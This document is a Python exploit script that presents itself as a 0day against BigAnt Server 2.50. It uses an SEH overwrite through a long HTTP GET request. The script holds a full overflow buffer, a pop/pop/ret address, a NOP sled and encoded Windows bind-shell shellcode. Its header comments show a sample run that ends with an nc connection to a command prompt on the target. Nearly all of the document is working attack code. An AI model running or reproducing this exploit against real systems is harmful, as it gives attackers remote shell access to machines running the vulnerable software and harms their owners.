#!/usr/bin/python
# BigAnt Server version 2.50 SEH Overwrite - 0day
# Written and discovered by Blake
# Tested on Windows XP SP3
# 
# $ ./bigant.py 192.168.1.131 6660
#
# [*] BigAnt Server v2.50 SEH Overwrite 0day
# [*] Written and discovered by Blake
# [*] Tested on Windows XP SP3
#
# [+] Connecting to 192.168.1.131 on port 6660
# [+] Sending payload
# [+] Connect to bind shell on port 4444
#
# $ nc 192.168.1.131 4444
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\WINDOWS\system32>

import socket, sys

if len(sys.argv)!= 3:
	print "\n[*] Usage: %s <ip> <port>\n" % sys.argv[0]
	sys.exit(0)

host = sys.argv[1]
port = int(sys.argv[2]) 	# port 6660 by default

# windows/shell_bind_tcp - 696 bytes  Encoder: x86/alpha_mixed
# EXITFUNC=seh, LPORT=4444, RHOST=
shellcode = (
"\x89\xe2\xdb\xcc\xd9\x72\xf4\x5f\x57\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x4b\x4c\x42\x4a\x4a\x4b\x50\x4d\x4b\x58\x4b\x49\x4b\x4f\x4b"
"\x4f\x4b\x4f\x43\x50\x4c\x4b\x42\x4c\x51\x34\x46\x44\x4c\x4b"
"\x50\x45\x47\x4c\x4c\x4b\x43\x4c\x43\x35\x44\x38\x43\x31\x4a"
"\x4f\x4c\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x51\x30\x45\x51"
"\x4a\x4b\x50\x49\x4c\x4b\x47\x44\x4c\x4b\x45\x51\x4a\x4e\x50"
"\x31\x49\x50\x4a\x39\x4e\x4c\x4b\x34\x49\x50\x44\x34\x43\x37"
"\x49\x51\x49\x5a\x44\x4d\x45\x51\x48\x42\x4a\x4b\x4c\x34\x47"
"\x4b\x50\x54\x46\x44\x46\x48\x44\x35\x4b\x55\x4c\x4b\x51\x4f"
"\x46\x44\x43\x31\x4a\x4b\x43\x56\x4c\x4b\x44\x4c\x50\x4b\x4c"
"\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x44\x43\x46\x4c\x4c\x4b"
"\x4d\x59\x42\x4c\x47\x54\x45\x4c\x43\x51\x49\x53\x50\x31\x49"
"\x4b\x43\x54\x4c\x4b\x47\x33\x46\x50\x4c\x4b\x47\x30\x44\x4c"
"\x4c\x4b\x42\x50\x45\x4c\x4e\x4d\x4c\x4b\x47\x30\x43\x38\x51"
"\x4e\x45\x38\x4c\x4e\x50\x4e\x44\x4e\x4a\x4c\x46\x30\x4b\x4f"
"\x4e\x36\x45\x36\x46\x33\x43\x56\x45\x38\x47\x43\x46\x52\x42"
"\x48\x43\x47\x42\x53\x46\x52\x51\x4f\x50\x54\x4b\x4f\x48\x50"
"\x42\x48\x48\x4b\x4a\x4d\x4b\x4c\x47\x4b\x46\x30\x4b\x4f\x48"
"\x56\x51\x4f\x4d\x59\x4b\x55\x45\x36\x4b\x31\x4a\x4d\x43\x38"
"\x45\x52\x46\x35\x43\x5a\x45\x52\x4b\x4f\x48\x50\x45\x38\x49"
"\x49\x44\x49\x4a\x55\x4e\x4d\x51\x47\x4b\x4f\x48\x56\x51\x43"
"\x51\x43\x51\x43\x51\x43\x46\x33\x51\x53\x50\x53\x47\x33\x51"
"\x43\x4b\x4f\x4e\x30\x42\x46\x43\x58\x42\x31\x51\x4c\x45\x36"
"\x46\x33\x4b\x39\x4d\x31\x4c\x55\x45\x38\x4e\x44\x44\x5a\x42"
"\x50\x49\x57\x50\x57\x4b\x4f\x49\x46\x42\x4a\x44\x50\x50\x51"
"\x50\x55\x4b\x4f\x48\x50\x45\x38\x49\x34\x4e\x4d\x46\x4e\x4a"
"\x49\x46\x37\x4b\x4f\x4e\x36\x50\x53\x46\x35\x4b\x4f\x48\x50"
"\x43\x58\x4b\x55\x47\x39\x4c\x46\x50\x49\x46\x37\x4b\x4f\x48"
"\x56\x46\x30\x50\x54\x50\x54\x46\x35\x4b\x4f\x4e\x30\x4c\x53"
"\x42\x48\x4b\x57\x44\x39\x48\x46\x44\x39\x50\x57\x4b\x4f\x48"
"\x56\x51\x45\x4b\x4f\x4e\x30\x42\x46\x43\x5a\x42\x44\x42\x46"
"\x43\x58\x43\x53\x42\x4d\x4c\x49\x4b\x55\x43\x5a\x46\x30\x51"
"\x49\x51\x39\x48\x4c\x4d\x59\x4d\x37\x42\x4a\x51\x54\x4b\x39"
"\x4a\x42\x50\x31\x49\x50\x4a\x53\x4e\x4a\x4b\x4e\x50\x42\x46"
"\x4d\x4b\x4e\x50\x42\x46\x4c\x4a\x33\x4c\x4d\x43\x4a\x47\x48"
"\x4e\x4b\x4e\x4b\x4e\x4b\x45\x38\x42\x52\x4b\x4e\x4e\x53\x42"
"\x36\x4b\x4f\x42\x55\x47\x34\x4b\x4f\x49\x46\x51\x4b\x50\x57"
"\x51\x42\x50\x51\x46\x31\x50\x51\x43\x5a\x43\x31\x50\x51\x50"
"\x51\x51\x45\x50\x51\x4b\x4f\x48\x50\x42\x48\x4e\x4d\x48\x59"
"\x45\x55\x48\x4e\x50\x53\x4b\x4f\x49\x46\x42\x4a\x4b\x4f\x4b"
"\x4f\x47\x47\x4b\x4f\x4e\x30\x4c\x4b\x51\x47\x4b\x4c\x4b\x33"
"\x48\x44\x45\x34\x4b\x4f\x49\x46\x50\x52\x4b\x4f\x4e\x30\x45"
"\x38\x4a\x50\x4d\x5a\x43\x34\x51\x4f\x51\x43\x4b\x4f\x4e\x36"
"\x4b\x4f\x4e\x30\x41\x41")


payload = "\x41" * 985		# seh overwritten at 989
next_seh = "\xeb\x06\x90\x90"   # short jump 6 bytes
seh = "\x6a\x19\x9a\x0f"	# p/p/r from vbajet32.dll
nops = "\x90" * 10		# nop sled
sc = shellcode			# 710 bytes available for shellcode

print "\n[*] BigAnt Server v2.50 SEH Overwrite 0day"
print "[*] Written and discovered by Blake"
print "[*] Tested on Windows XP SP3\n"

print "[+] Connecting to %s on port %d" % (host,port)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((host,port))
except:
	print "[x] Error establishing connection\n"
	sys.exit(0)

print "[+] Sending payload"
s.send("GET " + payload + next_seh + seh + nops + sc + "\r\n\r\n")
s.close()
print "[+] Connect to bind shell on port 4444\n"

